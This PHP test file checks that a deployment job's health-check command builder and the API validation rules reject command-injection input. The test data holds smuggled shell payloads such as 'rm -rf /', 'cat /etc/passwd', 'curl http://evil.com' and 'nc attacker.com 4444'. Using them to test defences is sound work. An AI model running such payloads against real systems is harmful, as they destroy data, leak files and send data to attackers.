<?php

use App\Jobs\ApplicationDeploymentJob;
use App\Models\Application;
use App\Models\ApplicationDeploymentQueue;
use App\Models\ApplicationSetting;
use Illuminate\Support\Facades\Validator;
use Tests\TestCase;

uses(TestCase::class);

beforeEach(function () {
    Mockery::close();
});

afterEach(function () {
    Mockery::close();
});

it('sanitizes health_check_host to prevent command injection', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_host' => 'localhost; id > /tmp/pwned #',
    ]);

    // Should fall back to 'localhost' because input contains shell metacharacters
    expect($result)->not->toContain('; id')
        ->and($result)->not->toContain('/tmp/pwned')
        ->and($result)->toContain('localhost');
});

it('sanitizes health_check_method to prevent command injection', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_method' => 'GET; curl http://evil.com #',
    ]);

    expect($result)->not->toContain('evil.com')
        ->and($result)->not->toContain('; curl');
});

it('sanitizes health_check_path to prevent command injection', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_path' => '/health; rm -rf / #',
    ]);

    expect($result)->not->toContain('rm -rf')
        ->and($result)->not->toContain('; rm');
});

it('sanitizes health_check_scheme to prevent command injection', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_scheme' => 'http; cat /etc/passwd #',
    ]);

    expect($result)->not->toContain('/etc/passwd')
        ->and($result)->not->toContain('; cat');
});

it('casts health_check_port to integer to prevent injection', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_port' => '8080; whoami',
    ]);

    // (int) cast on non-numeric after digits yields 8080
    expect($result)->not->toContain('whoami')
        ->and($result)->toContain('8080');
});

it('generates valid healthcheck command with safe inputs', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_method' => 'GET',
        'health_check_scheme' => 'http',
        'health_check_host' => 'localhost',
        'health_check_port' => '8080',
        'health_check_path' => '/health',
    ]);

    expect($result)->toContain('curl -s -X')
        ->and($result)->toContain('http://localhost:8080/health')
        ->and($result)->toContain('wget -q -O-');
});

it('uses escapeshellarg on the constructed URL', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_host' => 'my-app.local',
        'health_check_path' => '/api/health',
    ]);

    // escapeshellarg wraps in single quotes
    expect($result)->toContain("'http://my-app.local:80/api/health'");
});

it('validates health_check_host rejects shell metacharacters via API rules', function () {
    $rules = sharedDataApplications();

    $validator = Validator::make(
        ['health_check_host' => 'localhost; id #'],
        ['health_check_host' => $rules['health_check_host']]
    );

    expect($validator->fails())->toBeTrue();
});

it('validates health_check_method rejects invalid methods via API rules', function () {
    $rules = sharedDataApplications();

    $validator = Validator::make(
        ['health_check_method' => 'GET; curl evil.com'],
        ['health_check_method' => $rules['health_check_method']]
    );

    expect($validator->fails())->toBeTrue();
});

it('validates health_check_scheme rejects invalid schemes via API rules', function () {
    $rules = sharedDataApplications();

    $validator = Validator::make(
        ['health_check_scheme' => 'http; whoami'],
        ['health_check_scheme' => $rules['health_check_scheme']]
    );

    expect($validator->fails())->toBeTrue();
});

it('validates health_check_path rejects shell metacharacters via API rules', function () {
    $rules = sharedDataApplications();

    $validator = Validator::make(
        ['health_check_path' => '/health; rm -rf /'],
        ['health_check_path' => $rules['health_check_path']]
    );

    expect($validator->fails())->toBeTrue();
});

it('validates health_check_port rejects non-numeric values via API rules', function () {
    $rules = sharedDataApplications();

    $validator = Validator::make(
        ['health_check_port' => '8080; whoami'],
        ['health_check_port' => $rules['health_check_port']]
    );

    expect($validator->fails())->toBeTrue();
});

it('allows valid health check values via API rules', function () {
    $rules = sharedDataApplications();

    $validator = Validator::make(
        [
            'health_check_host' => 'my-app.localhost',
            'health_check_method' => 'GET',
            'health_check_scheme' => 'https',
            'health_check_path' => '/api/v1/health',
            'health_check_port' => 8080,
        ],
        [
            'health_check_host' => $rules['health_check_host'],
            'health_check_method' => $rules['health_check_method'],
            'health_check_scheme' => $rules['health_check_scheme'],
            'health_check_path' => $rules['health_check_path'],
            'health_check_port' => $rules['health_check_port'],
        ]
    );

    expect($validator->fails())->toBeFalse();
});

it('generates CMD healthcheck command directly', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => 'pg_isready -U postgres',
    ]);

    expect($result)->toBe('pg_isready -U postgres');
});

it('strips newlines from CMD healthcheck command', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => "redis-cli\nping",
    ]);

    expect($result)->not->toContain("\n")
        ->and($result)->toBe('redis-cli ping');
});

it('falls back to HTTP healthcheck when CMD type has empty command', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => '',
    ]);

    // Should fall through to HTTP path
    expect($result)->toContain('curl -s -X');
});

it('falls back to HTTP healthcheck when CMD command contains shell metacharacters', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => 'curl localhost; rm -rf /',
    ]);

    // Semicolons are blocked by runtime regex — falls back to HTTP healthcheck
    expect($result)->toContain('curl -s -X')
        ->and($result)->not->toContain('rm -rf');
});

it('falls back to HTTP healthcheck when CMD command contains pipe operator', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => 'echo test | nc attacker.com 4444',
    ]);

    expect($result)->toContain('curl -s -X')
        ->and($result)->not->toContain('nc attacker.com');
});

it('falls back to HTTP healthcheck when CMD command contains subshell', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => 'curl $(cat /etc/passwd)',
    ]);

    expect($result)->toContain('curl -s -X')
        ->and($result)->not->toContain('/etc/passwd');
});

it('falls back to HTTP healthcheck when CMD command exceeds 1000 characters', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => str_repeat('a', 1001),
    ]);

    // Exceeds max length — falls back to HTTP healthcheck
    expect($result)->toContain('curl -s -X');
});

it('falls back to HTTP healthcheck when CMD command contains backticks', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => 'curl `cat /etc/passwd`',
    ]);

    expect($result)->toContain('curl -s -X')
        ->and($result)->not->toContain('/etc/passwd');
});

it('uses sanitized method in full_healthcheck_url display', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_method' => 'INVALID;evil',
        'health_check_host' => 'localhost',
    ]);

    // Method should be sanitized to 'GET' (default) in both command and display
    expect($result)->toContain("'GET'")
        ->and($result)->not->toContain('evil');
});

it('validates healthCheckCommand rejects strings over 1000 characters', function () {
    $rules = [
        'healthCheckCommand' => 'nullable|string|max:1000',
    ];

    $validator = Validator::make(
        ['healthCheckCommand' => str_repeat('a', 1001)],
        $rules
    );

    expect($validator->fails())->toBeTrue();
});

it('validates healthCheckCommand accepts strings under 1000 characters', function () {
    $rules = [
        'healthCheckCommand' => 'nullable|string|max:1000',
    ];

    $validator = Validator::make(
        ['healthCheckCommand' => 'pg_isready -U postgres'],
        $rules
    );

    expect($validator->fails())->toBeFalse();
});

/**
 * Helper: Invokes the private generate_healthcheck_commands() method via reflection.
 */
function callGenerateHealthcheckCommands(array $overrides = []): string
{
    $defaults = [
        'health_check_type' => 'http',
        'health_check_command' => null,
        'health_check_method' => 'GET',
        'health_check_scheme' => 'http',
        'health_check_host' => 'localhost',
        'health_check_port' => null,
        'health_check_path' => '/',
        'ports_exposes' => '80',
    ];

    $values = array_merge($defaults, $overrides);

    $application = Mockery::mock(Application::class)->makePartial();
    $application->shouldReceive('getAttribute')->with('health_check_type')->andReturn($values['health_check_type']);
    $application->shouldReceive('getAttribute')->with('health_check_command')->andReturn($values['health_check_command']);
    $application->shouldReceive('getAttribute')->with('health_check_method')->andReturn($values['health_check_method']);
    $application->shouldReceive('getAttribute')->with('health_check_scheme')->andReturn($values['health_check_scheme']);
    $application->shouldReceive('getAttribute')->with('health_check_host')->andReturn($values['health_check_host']);
    $application->shouldReceive('getAttribute')->with('health_check_port')->andReturn($values['health_check_port']);
    $application->shouldReceive('getAttribute')->with('health_check_path')->andReturn($values['health_check_path']);
    $application->shouldReceive('getAttribute')->with('ports_exposes_array')->andReturn(explode(',', $values['ports_exposes']));
    $application->shouldReceive('getAttribute')->with('build_pack')->andReturn('nixpacks');

    $settings = Mockery::mock(ApplicationSetting::class)->makePartial();
    $settings->shouldReceive('getAttribute')->with('is_static')->andReturn(false);
    $application->shouldReceive('getAttribute')->with('settings')->andReturn($settings);

    $deploymentQueue = Mockery::mock(ApplicationDeploymentQueue::class)->makePartial();
    $deploymentQueue->shouldReceive('addLogEntry')->andReturnNull();

    $job = Mockery::mock(ApplicationDeploymentJob::class)->makePartial();

    $reflection = new ReflectionClass(ApplicationDeploymentJob::class);

    $appProp = $reflection->getProperty('application');
    $appProp->setAccessible(true);
    $appProp->setValue($job, $application);

    $queueProp = $reflection->getProperty('application_deployment_queue');
    $queueProp->setAccessible(true);
    $queueProp->setValue($job, $deploymentQueue);

    $method = $reflection->getMethod('generate_healthcheck_commands');
    $method->setAccessible(true);

    return $method->invoke($job);
}
